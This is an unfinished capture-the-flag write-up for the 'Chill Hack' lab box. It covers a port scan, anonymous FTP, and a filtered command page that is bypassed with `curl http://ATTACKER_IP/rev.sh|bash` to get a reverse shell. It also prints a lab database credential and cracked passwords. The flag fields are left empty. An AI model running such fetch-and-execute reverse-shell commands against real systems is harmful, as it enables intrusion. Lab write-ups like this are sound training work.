# Chill Hack
(Flags are at the end of this write up)

### Investigate!
Initial scan shows port 21,22 and 80 open: 

Nmap scan report for 10.10.234.14
Host is up (0.058s latency).                                                 
                                                                             
    PORT   STATE SERVICE VERSION                                                 
    21/tcp open  ftp     vsftpd 3.0.3                                            
    | ftp-syst:                                                                  
    |   STAT:                                                                    
    | FTP server status:                                                         
    |      Connected to ::ffff:10.14.90.188                                      
    |      Logged in as ftp                                                      
    |      TYPE: ASCII                                                           
    |      No session bandwidth limit                                            
    |      Session timeout in seconds is 300                                     
    |      Control connection is plain text                                      
    |      Data connections will be plain text                                   
    |      At session startup, client count was 2                                
    |      vsFTPd 3.0.3 - secure, fast, stable                                   
    |_End of status                                                              
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)                       
    |_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt           
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                         
    | ssh-hostkey:                                                               
    |   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)               
    |   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
    |_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-title: Game Info
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

The ftp server contains the following note:<br />
![image](https://github.com/user-attachments/assets/4f8fa8bc-bcf5-4fd1-822a-9d3d8dd156ff)<br />
Directory enumeration reveals a `/secret` directory:<br />
![image](https://github.com/user-attachments/assets/822e6da3-2aa7-4d16-88a5-2b4946036515)<br />
There's a filter that won't allow me to run commands such as `ls` or `nc`. However I found a way to spawn a reverse shell. The `curl` command is not filtered. So create a `rev.sh` containing the code for a reverse shell, then open a netcat listener (I used port 4444),
and then run the command `curl http://ATTACKER_IP/rev.sh|bash`<br />
![image](https://github.com/user-attachments/assets/f4227d70-02b3-4338-8e8d-fe8d3afef683)<br />
Inside `/var/www/files/index.php`, I found a set of credentials:<br />
![image](https://github.com/user-attachments/assets/bbe00638-77db-4130-8cd1-22e48b59e7a6)<br />
root:!@m+her00+@db<br />
There are two hashes inside this database:<br />
![image](https://github.com/user-attachments/assets/a238661c-35c4-4d51-90f1-a43706357704)<br />
These passwords are respectively:<br />
`masterpassword`<br />
`dontaskdonttell`<br />
TO BE CONTINUED...





- User flag:
- Root flag:
